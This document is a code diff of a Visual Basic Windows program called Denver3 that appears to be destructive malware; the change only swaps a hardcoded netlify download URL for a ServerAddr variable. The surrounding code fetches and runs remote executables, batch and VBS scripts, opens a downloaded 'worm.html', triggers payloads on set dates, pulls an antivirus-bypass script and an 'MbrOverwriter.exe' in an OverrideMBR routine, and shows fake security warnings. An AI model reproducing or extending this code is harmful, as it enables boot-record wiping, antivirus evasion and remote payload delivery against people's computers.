@@ -18,9 +18,6 @@ Public Class Form1
     Private Const SPIF_SENDWININICHANGE As Integer = &H2
     Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
     Const WallpaperFile As String = "c:\wallpaper.bmp"
-
-
-
     Dim Close1 As Boolean = False
     Private ReadOnly filePath As String = "first_open.txt"
 
@@ -85,12 +82,12 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
         If My.Computer.FileSystem.FileExists(InstallPath & "\Denver3.runtime") Then
             Try
-                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
+                My.Computer.Network.DownloadFile(ServerAddr & "Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
             Catch ex As Exception
                 '  MsgBox("This program maintains a small file size by downloading its files from an external server. Please download and install the server manually: https://denver3289yf998dh287hd9hd9827h.netlify.app/ServerFiles.exe", 0 + 16, "Failed to download files")
             End Try
             Try
-                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
+                My.Computer.Network.DownloadFile(ServerAddr & "AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
             Catch ex As Exception
 
             End Try
@@ -109,7 +106,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                 RipZ3CK100.ShowDialog()
             ElseIf payloadchance = 4 Then
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/GDI.EXE", InstallPath & "\GDI.EXE")
+                    My.Computer.Network.DownloadFile(ServerAddr & "GDI.EXE", InstallPath & "\GDI.EXE")
                 Catch ex As Exception
 
                 End Try
@@ -120,7 +117,6 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                 End Try
             End If
 
-            'https://denver3289yf998dh287hd9hd9827h.netlify.app/TrainFurry.mp4
 
             If currentTime.Month = 9 And currentTime.Date.Day = 11 Then
                 RipConeehasOldAcc.Show()
@@ -151,7 +147,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             If currentTime.Month = 2 And currentTime.Date.Day = 3 Then
                 SetWallpaper(PIC_BILL_NYE.Image)
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/billnye.wav", InstallPath & "\billnye.wav")
+                    My.Computer.Network.DownloadFile(ServerAddr & "billnye.wav", InstallPath & "\billnye.wav")
                 Catch ex As Exception
                 End Try
                 My.Computer.Audio.Play(InstallPath & "\billnye.wav", AudioPlayMode.BackgroundLoop)
@@ -281,13 +277,13 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             End If
             If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/spongebob.wav", InstallPath & "\spongebob.wav")
+                    My.Computer.Network.DownloadFile(ServerAddr & "spongebob.wav", InstallPath & "\spongebob.wav")
                 Catch ex As Exception
                 End Try
                 My.Computer.Audio.Play(InstallPath & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
             End If
             If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
-                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
+                My.Computer.Network.DownloadFile(ServerAddr & "worm.html", InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
                 Process.Start(InstallPath & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
             End If
             If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
@@ -297,19 +293,19 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
                 MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
                 'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav", InstallPath & "\NAHIMTOOPOWERRFULL_666.wav")
+                    My.Computer.Network.DownloadFile(ServerAddr & "NAHIMTOOPOWERRFULL_666.wav", InstallPath & "\NAHIMTOOPOWERRFULL_666.wav")
 
 
                 Catch ex As Exception
 
                 End Try
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/NAH.CMD", InstallPath & "\NAH.CMD")
+                    My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", InstallPath & "\NAH.CMD")
                 Catch ex As Exception
 
                 End Try
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/SkillE.vbs", InstallPath & "\SkillE.vbs")
+                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs")
 
                 Catch ex As Exception
 
@@ -328,7 +324,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
             If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav
+                    My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav
 
                 Catch ex As Exception
 
@@ -342,7 +338,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             If currentTime.Month = 9 And currentTime.Date.Day = 2 Then
                 MsgBox("I think your pc has a virus (=", 0 + 64, "Denver3.exe | Yuki3.exe")
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AVTESTFILE.EXE", InstallPath & "\AVTESTFILE.EXE")
+                    My.Computer.Network.DownloadFile(ServerAddr & "AVTESTFILE.EXE", InstallPath & "\AVTESTFILE.EXE")
                 Catch ex As Exception
                 End Try
                 For index As Integer = 1 To 30 'OverLoadAntiVirus
@@ -358,7 +354,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             End If
             If currentTime.Month = 11 Then
                 Try
-                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
+                    My.Computer.Network.DownloadFile(ServerAddr & "8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
                 Catch ex As Exception
                 End Try
                 My.Computer.Audio.Play(InstallPath & "\Neon.wav", AudioPlayMode.BackgroundLoop)
@@ -373,7 +369,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
     Public Sub ChangeMD5AndExit()
         Try
-            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/basic.MD5.antivirus.bypass.cmd", Application.StartupPath & "\basic.MD5.antivirus.bypass.cmd")
+            My.Computer.Network.DownloadFile(ServerAddr & "basic.MD5.antivirus.bypass.cmd", Application.StartupPath & "\basic.MD5.antivirus.bypass.cmd")
         Catch ex As Exception
         End Try
         Try
@@ -441,7 +437,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         Dim a13 As New still_using_this_computer()
         Dim a14 As New still_using_this_computer()
         Try
-            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/SCP_SL_Light_Containment_Zone_8Bit.wav", InstallPath & "\urdone1.wav")
+            My.Computer.Network.DownloadFile(ServerAddr & "SCP_SL_Light_Containment_Zone_8Bit.wav", InstallPath & "\urdone1.wav")
         Catch ex As Exception
         End Try
         My.Computer.Audio.Play(InstallPath & "\urdone1.wav", AudioPlayMode.BackgroundLoop)
@@ -688,10 +684,10 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
 
     Public Sub OverrideMBR() 'fucks your pc
         Try
-            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/MbrOverwriter.exe", InstallPath & "\MbrOverwriter.exe")
+            My.Computer.Network.DownloadFile(ServerAddr & "MbrOverwriter.exe", InstallPath & "\MbrOverwriter.exe")
         Catch ex As Exception
             Try
-                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/MbrOverwriter.exe", InstallPath & "\MbrOverwriter.exe")
+                My.Computer.Network.DownloadFile(ServerAddr & "MbrOverwriter.exe", InstallPath & "\MbrOverwriter.exe")
             Catch ex1 As Exception
 
             End Try
@@ -722,7 +718,7 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
         Try
             Dim random As New Random()
             Dim randomNumber As Integer = random.Next(1, 63463456)
-            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/NAH.CMD", Application.StartupPath & "\" & randomNumber)
+            My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", Application.StartupPath & "\" & randomNumber)
             My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\" & randomNumber)
             Return True
         Catch ex As Exception
